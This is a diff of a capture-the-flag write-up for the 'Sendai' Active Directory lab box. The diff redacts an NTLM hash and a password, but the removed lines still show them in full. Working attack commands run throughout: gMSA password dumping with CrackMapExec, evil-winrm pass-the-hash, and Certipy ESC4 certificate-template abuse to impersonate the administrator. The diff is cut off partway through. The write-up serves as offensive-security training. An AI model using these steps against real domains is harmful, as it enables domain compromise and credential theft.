@@ -212,7 +212,7 @@ cme ldap 10.10.96.234 -u 'Elliot.Yates' -p 'Tata01!' --gmsa
 SMB         10.10.96.234    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
 LDAP        10.10.96.234    636    DC               [+] sendai.vl\Elliot.Yates:Tata01!
 LDAP        10.10.96.234    636    DC               [*] Getting GMSA Passwords
-LDAP        10.10.96.234    636    DC               Account: mgtsvc$              NTLM: 52ece1a97fb6c834236d7e9aa44c1a20
+LDAP        10.10.96.234    636    DC               Account: mgtsvc$              NTLM: 52[...]a20
 ```
 Some links here for explanation :
 [https://www.thehacker.recipes/a-d/movement/dacl/addmember](https://www.thehacker.recipes/a-d/movement/dacl/addmember)
@@ -223,21 +223,21 @@ Some links here for explanation :
 
 ```bash
 # WinRM
-evil-winrm -u 'mgtsvc$' -H '52ece1a97fb6c834236d7e9aa44c1a20' -i 10.10.96.234
+evil-winrm -u 'mgtsvc$' -H '52[...]a20' -i 10.10.96.234
 ```
 Now let's enumerate the box with PrivescCheck.ps1
 
 ```powershell
 . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
 ```
-![alt text](../assets/image_sendai/4er.png)
+Get the creds of Clifford
 
 ## Privesc ESC4
 
 Now let's do some ADCS enumeration
 
 ```bash
-certipy find -u 'Clifford.Davey'@'dc.sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip '10.10.96.234' -vulnerable -stdout -debug
+certipy find -u 'Clifford.Davey'@'dc.sendai.vl' -p 'REDACTED' -dc-ip '10.10.96.234' -vulnerable -stdout -debug
 
 CA Name : sendai-DC-CA
 Template Name : SendaiComputer
@@ -251,14 +251,14 @@ As you can see, Clifford is in ca-operators, so let's abuse :
 [https://www.thehacker.recipes/a-d/movement/ad-cs/access-controls#certificate-templates-esc4](https://www.thehacker.recipes/a-d/movement/ad-cs/access-controls#certificate-templates-esc4)
 
 ```bash
-certipy template -u 'Clifford.Davey'@'sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip '10.10.96.234' -template SendaiComputer -save-old
+certipy template -u 'Clifford.Davey'@'sendai.vl' -p 'REDACTED' -dc-ip '10.10.96.234' -template SendaiComputer -save-old
 
 [*] Saved old configuration for 'SendaiComputer' to 'SendaiComputer.json'
 [*] Updating certificate template 'SendaiComputer'
 [*] Successfully updated 'SendaiComputer'
 ```
 ```bash
-certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -ca 'sendai-DC-CA' -dc-ip 10.10.96.234 -target dc.sendai.vl -template 'SendaiComputer' -upn administrator -debug
+certipy req -u 'clifford.davey' -p 'REDACTED' -ca 'sendai-DC-CA' -dc-ip 10.10.96.234 -target dc.sendai.vl -template 'SendaiComputer' -upn administrator -debug
 
 [+] Trying to resolve 'dc.sendai.vl' at '10.10.96.234'
 [+] Generating RSA key
